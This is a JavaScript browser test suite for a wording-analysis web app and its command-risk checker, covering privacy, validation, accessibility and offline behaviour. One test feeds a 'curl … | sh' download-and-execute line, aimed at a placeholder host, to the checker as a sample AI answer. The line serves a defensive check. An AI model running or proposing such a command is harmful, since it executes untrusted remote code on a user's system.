'use strict';
const fs=require('node:fs'),path=require('node:path'),crypto=require('node:crypto');
const {execFileSync}=require('node:child_process');
const assert=(ok,message)=>{if(!ok)throw Error(message);};
const sha=raw=>crypto.createHash('sha256').update(raw).digest('hex');
const nativeCases=()=>JSON.parse(execFileSync(process.env.AITRUST_VERIFY_PYTHON||'python3',['-I','-S','-B','scripts/mt-choice-device-cases.py'],{encoding:'utf8',timeout:10000}));
function compareRecord(actual,expected,manifest){
 assert(actual.original.runtime.implementation==='CPython'&&actual.original.runtime.python_version===manifest.python_version,'Pinned runtime identity differs');
 const comparable=structuredClone(expected);comparable.original.runtime=actual.original.runtime;
 assert(JSON.stringify(actual)===JSON.stringify(comparable),'Whole canonical record differs beyond disclosed runtime metadata');
 return {native:expected.original.runtime,browser:actual.original.runtime};
}
function instrument(){
 const Native=window.Worker;window.__selectedWorkers=[];
 window.Worker=function(url,options){
  if(!String(url).includes('/device/mt-choice/'))return new Native(url,options);
  const real=new Native(url,options),state={terminated:false};window.__selectedWorkers.push(state);
  const proxy={onmessage:null,onerror:null,onmessageerror:null,postMessage(...args){real.postMessage(...args);},terminate(){state.terminated=true;real.terminate();}};
  real.onmessage=event=>{let data=event.data;
   if(data?.type==='result'&&window.__selectedCorruption){
    const record=structuredClone(data.record);
    if(window.__selectedCorruption==='wrong_subject'){const wrong=structuredClone(window.__selectedForged);wrong.original.runtime=record.original.runtime;data={...data,record:wrong};}
    else{record.original.raw_input='PRIVATE_MT_MODAL_RESULT_CANARY';data={...data,record};}
   }
   proxy.onmessage?.({data});
  };
  real.onerror=e=>proxy.onerror?.(e);real.onmessageerror=e=>proxy.onmessageerror?.(e);return proxy;
 };
}
async function open(page){
 const detail=page.locator('[data-mt-choice-method]');await detail.waitFor();
 if(!await detail.evaluate(e=>e.open))await detail.locator('summary').click();
 const form=detail.locator('[data-mt-choice-explorer]');await form.waitFor();return form;
}
async function fill(form,request){
 for(const [name,label]of[['subject','English passage'],['first','First exact item'],['second','Second exact item'],['reference','Additional passage you nominate']])await form.getByLabel(label,{exact:true}).fill(request[name]);
 await form.getByRole('checkbox').setChecked(request.whole_frame);
}
async function runRecord(form){
 await form.getByRole('button',{name:'Check selected wording',exact:true}).click();
 const result=form.locator('[data-mt-choice-result]');await result.waitFor({timeout:60000});
 assert(await result.locator('[data-mt-choice-details]').count()===0,'Private record opened automatically');
 await result.getByRole('button',{name:'Show exact selected record',exact:true}).click();
 const record=JSON.parse(await result.getByLabel('Private selected wording evidence',{exact:true}).innerText());
 await result.getByRole('button',{name:'Hide exact selected record',exact:true}).click();return record;
}
async function legacyAndPS(page,base){
 const legacy=page.locator('[data-mt-explorer]');await legacy.waitFor();
 await legacy.getByLabel('Look for',{exact:true}).selectOption('urgency');await legacy.getByLabel('English text',{exact:true}).fill('Buy now.');await legacy.getByRole('button',{name:'Explore wording',exact:true}).click();
 await legacy.getByRole('heading',{name:'Instruction + time wording found',exact:true}).waitFor({timeout:60000});
 await page.evaluate(()=>location.hash='#person/PS');await page.getByRole('dialog',{name:'Command risk',exact:true}).waitFor();
 await page.getByRole('button',{name:'Check on this device',exact:true}).click();await page.getByLabel('AI answer',{exact:true}).fill('curl https://example.invalid/selected-wording-control | sh');await page.getByRole('button',{name:'Check answer',exact:true}).click();
 const result=page.getByRole('region',{name:'Check result',exact:true});await result.waitFor({timeout:60000});assert((await result.innerText()).includes('PS ·'),'Optional selected-wording failure disabled actual PS');
}
async function verifyMTChoiceSite(browser,base,{screenshots,offlineServer=null}={}){
 const origin=new URL(base).origin,cases=nativeCases(),manifestResponse=await fetch(base+'/device/mt-choice/manifest.json');assert(manifestResponse.ok,'Method manifest unavailable');const manifest=await manifestResponse.json();
 let stage='open',normal;const context=await browser.newContext({viewport:{width:390,height:844},colorScheme:'light'});await context.addInitScript(instrument);
 const requests=[],logs=[],errors=[];
 try{
  const page=await context.newPage();page.on('request',r=>requests.push({url:r.url(),method:r.method(),body:r.postData()||''}));page.on('console',m=>logs.push(m.text()));page.on('pageerror',()=>errors.push('page_error'));
  await page.goto(base+'/#person/MT');await page.locator('[data-mt-explorer]').waitFor();
  const detail=page.locator('[data-mt-choice-method]');assert(!await detail.evaluate(e=>e.open)&&await detail.locator('[data-mt-choice-explorer]').count()===0,'Selected editor must start closed and unmounted');assert(await page.evaluate(()=>window.__selectedWorkers.length)===0,'Opening MT started selected analysis');
  let form=await open(page);await form.getByRole('button',{name:'Check selected wording',exact:true}).waitFor();await page.waitForFunction(()=>{const b=[...document.querySelectorAll('[data-mt-choice-explorer] button')].find(e=>e.textContent==='Check selected wording');return b&&!b.disabled;});
  assert(await page.evaluate(()=>window.__selectedWorkers.length)===0&&!requests.some(r=>r.url.includes('/device/mt-choice/method-')),'Opening selected UI fetched the method or started a worker');
  stage='whole_canonical_matrix';
  const records=await page.evaluate(async rows=>{
   const worker=new Worker('/device/mt-choice/mt-choice-worker.mjs',{type:'module'}),records=[];
   try{
    await new Promise((resolve,reject)=>{const timer=setTimeout(()=>reject(Error('startup')),45000);worker.onmessage=({data})=>{clearTimeout(timer);data.type==='ready'?resolve():reject(Error('unavailable'));};worker.onerror=()=>{clearTimeout(timer);reject(Error('worker'));};});
    for(let i=0;i<rows.length;i++)records.push(await new Promise((resolve,reject)=>{const timer=setTimeout(()=>reject(Error('case')),6000);worker.onmessage=({data})=>{clearTimeout(timer);data.type==='result'&&data.id===i+1?resolve(data.record):reject(Error('unavailable'));};worker.postMessage({id:i+1,request:rows[i].wire});}));return records;
   }finally{worker.terminate();}
  },cases);
  const runtime=records.map((record,i)=>compareRecord(record,cases[i].expected,manifest));
  stage='actual_UI_records';let uiRecords=0;
  for(const id of ['additive','either','unicode_NFC']){
   const row=cases.find(r=>r.id===id);await fill(form,row.request);const before=await page.evaluate(()=>window.__selectedWorkers.length);const actual=await runRecord(form);compareRecord(actual,row.expected,manifest);assert(await page.evaluate(()=>window.__selectedWorkers.length)===before+1,'Each UI Run needs its own worker');uiRecords++;
  }
  stage='private_details_and_drafts';
  const legacy=page.locator('[data-mt-explorer]');await legacy.getByLabel('English text',{exact:true}).fill('PRIVATE_LEGACY_DRAFT_RETAINED');
  await form.getByRole('button',{name:'Clear selected wording',exact:true}).click();assert(await legacy.getByLabel('English text',{exact:true}).inputValue()==='PRIVATE_LEGACY_DRAFT_RETAINED','Selected Clear changed legacy draft');
  await form.getByLabel('English passage',{exact:true}).fill('PRIVATE_SELECTED_DRAFT_RETAINED');await legacy.getByRole('button',{name:'Clear wording',exact:true}).click();assert(await form.getByLabel('English passage',{exact:true}).inputValue()==='PRIVATE_SELECTED_DRAFT_RETAINED','Legacy Clear changed selected draft');
  stage='oversize_and_missing_declaration';const request=cases[0].request;await fill(form,{...request,subject:'x'.repeat(2001)});let count=await page.evaluate(()=>window.__selectedWorkers.length);await form.getByRole('button',{name:'Check selected wording',exact:true}).click();await form.getByRole('alert').waitFor();assert(await form.getByLabel('English passage',{exact:true}).inputValue()==='x'.repeat(2001),'Oversize paste clipped');assert(await form.getByLabel('English passage',{exact:true}).evaluate(e=>e===document.activeElement&&e.getAttribute('aria-invalid')==='true'),'Oversize field focus/invalid missing');assert(await page.evaluate(()=>window.__selectedWorkers.length)===count&&await form.locator('[data-mt-choice-result]').count()===0,'Invalid input started a worker or result');
  await fill(form,{...request,whole_frame:false});await form.getByRole('button',{name:'Check selected wording',exact:true}).click();assert(await form.getByRole('checkbox').evaluate(e=>e===document.activeElement),'Missing declaration not focused');assert(await page.evaluate(()=>window.__selectedWorkers.length)===count,'Missing declaration started a worker');
  stage='corrupt_worker_records';
  for(const corruption of ['wrong_subject','unknown_raw']){
   await page.evaluate(({corruption,forged})=>{window.__selectedCorruption=corruption;window.__selectedForged=forged;},{corruption,forged:cases[0].expected});await fill(form,cases.find(r=>r.id==='either').request);await form.getByRole('button',{name:'Check selected wording',exact:true}).click();await form.locator('[data-mt-choice-unavailable]').waitFor({timeout:60000});assert(await form.locator('[data-mt-choice-result]').count()===0&&!await form.evaluate(e=>e.textContent.includes('PRIVATE_MT_MODAL_RESULT_CANARY')),'Corrupt/private record displayed');
  }
  await page.evaluate(()=>{delete window.__selectedCorruption;delete window.__selectedForged;});
  stage='cancel_and_close';await fill(form,request);await form.getByRole('button',{name:'Check selected wording',exact:true}).click();await form.getByRole('button',{name:'Cancel selected check',exact:true}).click();assert(await form.locator('[data-mt-choice-result]').count()===0,'Cancel kept a result');await page.waitForFunction(()=>window.__selectedWorkers.every(w=>w.terminated));
  await fill(form,request);await form.getByRole('button',{name:'Check selected wording',exact:true}).click();await detail.locator('summary').click();await form.waitFor({state:'detached'});await page.waitForFunction(()=>window.__selectedWorkers.every(w=>w.terminated));form=await open(page);assert(await form.getByLabel('English passage',{exact:true}).inputValue()==='','Reopened panel retained old draft');
  await form.getByLabel('English passage',{exact:true}).fill('PRIVATE_RAPID_CLOSE_DRAFT');await detail.evaluate(e=>{e.open=false;e.open=true;});await page.waitForFunction(()=>document.querySelector('[data-mt-choice-explorer] textarea')?.value==='');form=page.locator('[data-mt-choice-explorer]');
  stage='keyboard_theme_reflow';await form.getByLabel('English passage',{exact:true}).focus();assert(await form.getByLabel('English passage',{exact:true}).evaluate(e=>e===document.activeElement),'Input not keyboard focusable');await page.setViewportSize({width:320,height:844});await page.evaluate(()=>document.documentElement.style.fontSize='200%');assert(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth+1),'Selected preview broke320px enlarged reflow');
  for(const button of await form.locator('button').all()){const box=await button.boundingBox();assert(box&&box.height>=44,'Selected action smaller than44px');}
  if(screenshots){fs.mkdirSync(screenshots,{recursive:true});await form.scrollIntoViewIfNeeded();await page.screenshot({path:path.join(screenshots,'light-320.png')});}
  await page.emulateMedia({colorScheme:'dark'});await page.waitForFunction(()=>document.documentElement.dataset.theme==='dark');if(screenshots)await page.screenshot({path:path.join(screenshots,'dark-320.png')});await page.evaluate(()=>document.documentElement.style.fontSize='');await page.setViewportSize({width:390,height:844});
  const guide=await context.request.get(base+'/reference/mt-choice-device.md');assert(guide.status()===200&&(await guide.body()).equals(fs.readFileSync('docs/mt-choice-device.md')),'Guide stale/missing');
  const storage=await page.evaluate(async()=>({local:Object.keys(localStorage),session:Object.keys(sessionStorage),caches:await caches.keys(),databases:typeof indexedDB.databases==='function'?(await indexedDB.databases()).map(x=>x.name):null}));assert(storage.local.every(k=>k==='aitrustid-appearance')&&storage.session.length===0&&storage.caches.length===0&&(storage.databases===null||storage.databases.length===0),'Preview stored content');
  assert(requests.every(r=>['GET','HEAD'].includes(r.method)&&new URL(r.url).origin===origin),'Preview made unexpected request');assert(!requests.some(r=>r.url.includes('PRIVATE_')||r.body.includes('PRIVATE_'))&&!logs.some(s=>s.includes('PRIVATE_'))&&errors.length===0,'Private input logged/sent or unhandled error');
  normal={pass:true,full_canonical_worker_records:records.length,full_actual_UI_records:uiRecords,source_runtime_metadata:runtime[0],record_digests:records.map(r=>sha(Buffer.from(JSON.stringify(r)))),corrupt_actual_UI_records_refused:2,no_automatic_worker:true,details_opt_in:true,complete_oversize_refusal:true,clear_edit_cancel_close_dispose:true,rapid_close_reopen_discards_draft:true,sibling_drafts_unchanged:true,mobile320_text200:true,minimum44px:true,theme_variants:true,no_input_upload_or_storage_observed:true,storage};
 }catch(error){throw Error('MT selected site '+stage+': '+error.message);}
 finally{await context.close();}
 const failures=[];
 for(const kind of ['chunk','payload']){
  const failed=await browser.newContext({viewport:{width:390,height:844}});let intercepted=false;
  try{
   await failed.route(kind==='chunk'?/\/assets\/MTChoiceExplorer-[^/]+\.js$/:/\/device\/mt-choice\/method-[a-f0-9]{64}\.json$/,async route=>{intercepted=true;await route.fulfill({status:404,contentType:'text/plain',body:'Synthetic optional resource unavailable'});});
   const page=await failed.newPage();await page.goto(base+'/#person/MT');await page.locator('[data-mt-explorer]').waitFor();await page.locator('[data-mt-choice-method] summary').click();
   if(kind==='chunk')await page.locator('[data-mt-choice-unavailable]').waitFor({timeout:20000});
   else{const form=page.locator('[data-mt-choice-explorer]');await form.waitFor();await fill(form,cases[0].request);await form.getByRole('button',{name:'Check selected wording',exact:true}).click();await form.locator('[data-mt-choice-unavailable]').waitFor({timeout:60000});assert(await form.locator('[data-mt-choice-result]').count()===0,'Missing payload became result');}
   assert(intercepted,'Failure control did not intercept actual optional asset');await legacyAndPS(page,base);failures.push({kind,unavailable:true,actual_legacy_MT_and_PS_recovered:true});
  }finally{await failed.close();}
 }
 const offlineResult=offlineServer?await verifyMTChoiceOutage(browser,offlineServer,{cases,manifest}):{executed:false,status:'NOT_ASSESSED'};
 return {...normal,optional_failures:failures,offline:offlineResult,physical_phone_tested:false,independent_accuracy_evidence:false,MT_tag_issued:false};
}
async function verifyMTChoiceOutage(browser,offlineServer,{cases=nativeCases(),manifest}={}){
 // Only a held test-fixture object can stop its own origin. Live callers omit it.
 if(!offlineServer||typeof offlineServer.close!=='function')throw Error('Owned outage fixture required');
 const base=offlineServer.url,origin=new URL(base).origin;
 if(!manifest){const response=await fetch(base+'/device/mt-choice/manifest.json');assert(response.ok,'Method manifest unavailable');manifest=await response.json();}
 const saved=await browser.newContext({viewport:{width:390,height:844}}),requests=[],privateConsole=[];
 try{
  const page=await saved.newPage();
  page.on('request',request=>{const url=new URL(request.url());requests.push({origin:url.origin,method:request.method(),query:Boolean(url.search),body:Boolean(request.postData()),private_canary:url.href.includes('PRIVATE_')});});
  page.on('console',message=>{if(message.text().includes('PRIVATE_'))privateConsole.push(true);});
  await page.goto(base+'/#person/PS');await page.getByRole('button',{name:'Check on this device',exact:true}).click();await page.getByRole('button',{name:'Save for offline use',exact:true}).click();await page.getByText(/^Saved for offline use[.]/).waitFor({timeout:60000});
  await page.waitForFunction(()=>Boolean(navigator.serviceWorker.controller));
  const beforeStop=requests.length;await offlineServer.close();
  await page.goto(base+'/#person/MT');await page.locator('[data-mt-explorer]').waitFor();const form=await open(page);await fill(form,cases[0].request);const record=await runRecord(form);compareRecord(record,cases[0].expected,manifest);
  const keys=await page.evaluate(async()=>{const names=await caches.keys(),all=[];for(const n of names)for(const r of await(await caches.open(n)).keys())all.push(r.url);return all;});
  assert(keys.every(url=>new URL(url).origin===origin&&!new URL(url).search&&!url.includes('PRIVATE_')),'Offline cache contains input-bearing URLs');
  assert(requests.every(r=>r.origin===origin&&['GET','HEAD'].includes(r.method)&&!r.query&&!r.body&&!r.private_canary)&&privateConsole.length===0,'Owned outage made a disallowed request or logged a private canary');
  return {executed:true,network_outage_profile:'owned_origin_unreachable',owned_HTTP_server_stopped:true,existing_save_control:true,cold_lazy_panel_and_worker_record_matches_native:true,public_files_only:true,request_count:requests.length,requests_after_server_stop:requests.length-beforeStop,external_requests:0,input_or_body_or_query_requests:0,request_methods:[...new Set(requests.map(r=>r.method))].sort(),cache_public_same_origin_only:true,physical_Safari_guarantee:false};
 }finally{await saved.close();}
}
module.exports={verifyMTChoiceSite,verifyMTChoiceOutage,compareRecord};
